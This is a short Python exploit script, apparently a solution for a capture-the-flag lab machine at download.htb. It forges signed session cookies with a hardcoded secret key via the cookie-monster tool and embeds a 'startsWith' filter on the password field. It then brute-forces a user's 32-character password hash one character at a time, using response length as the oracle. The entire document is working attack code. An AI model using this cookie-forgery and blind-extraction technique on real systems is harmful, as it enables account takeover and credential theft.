
#!/usr/bin/python3

import string
import subprocess
import json
import os,sys,re
import requests

###############
regex = r"download_session=([\w=\-_]+).*download_session\.sig=([\w=\-_]+)"
###############

def gojson(j):
    with open("cookie.json", "w") as f:
        f.write(json.dumps(j))

def gencook(startsWith):
    yo = {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":startsWith}}}
    gojson(yo)
    zz = subprocess.check_output(["cookie-monster", "-e", "-f", "cookie.json", "-k", "zzzzzxxxxzzzzzzzzxxxxxxxx", "-n", "download_session"]).decode().replace("\n"," ")
    match = re.findall(regex, zz, re.MULTILINE)[0]
    return match

###############

userhash = ""

subset ="abcdef"+string.digits
for i in range(32):
    for s in subset:
        p = userhash + s
        (download_session, sig) = gencook(p)
        cookie = {"download_session": download_session, "download_session.sig": sig}
        print(p, end='\r')
        r = requests.get('http://download.htb/home/', cookies=cookie)
        if len(r.text) != 2174:
            userhash = p
            break

print()

##############
##
##


